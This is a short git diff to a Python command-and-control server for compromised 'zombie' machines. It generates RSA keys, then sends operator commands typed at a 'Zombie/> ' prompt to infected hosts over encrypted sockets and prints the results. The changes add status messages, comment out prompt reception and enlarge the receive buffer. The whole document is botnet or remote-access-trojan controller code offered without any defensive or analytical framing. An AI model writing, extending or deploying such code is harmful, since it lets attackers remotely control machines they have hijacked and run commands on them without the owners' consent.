@@ -4,9 +4,11 @@ import sys
 import time
 import rsa
 
+print("Generating encryption keys...")
 # Generate public and private RSA keys for the server
 public_key, private_key = rsa.newkeys(2048)
 public_partner = [None for i in range(100)]
+print("Done!\n")
 
 def acceptor(c, addr, s):
 		
@@ -55,10 +57,10 @@ def control(zombie, zombiepubkey):
 
 	try:
 		while True:	
-			prompt = rsa.decrypt(zombie.recv(5024), private_key).decode()	
-			sys.stdout.write(prompt)
+	#		prompt = rsa.decrypt(zombie.recv(5024), private_key).decode()	
+	#		sys.stdout.write(prompt)
 
-			d = input()
+			d = input("Zombie/> ")
 
 			if(d == "exit"):
 				break;
@@ -66,7 +68,7 @@ def control(zombie, zombiepubkey):
 			d += "\n"
 			zombie.send(rsa.encrypt(d.encode(), zombiepubkey))
 			
-			cmd = rsa.decrypt(zombie.recv(5024), private_key).decode()
+			cmd = rsa.decrypt(zombie.recv(15024), private_key).decode()
 			sys.stdout.write(cmd)
 			
 	except Exception as e:
